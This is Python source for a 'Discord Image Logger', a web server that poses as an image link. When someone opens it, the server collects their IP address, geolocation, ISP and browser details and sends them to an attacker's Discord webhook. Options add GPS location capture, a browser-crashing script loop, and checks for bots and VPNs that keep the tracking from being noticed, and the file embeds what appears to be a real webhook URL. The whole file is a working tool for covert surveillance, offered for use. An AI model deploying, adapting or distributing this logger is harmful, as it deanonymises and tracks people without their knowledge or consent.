# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1042035188932296735/jTNXm_2qQlsXZt-ewgFhkhFR8es7sG61a3250AcpzhhoKymfFSJZOTugTFNFZmf3ruIG",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
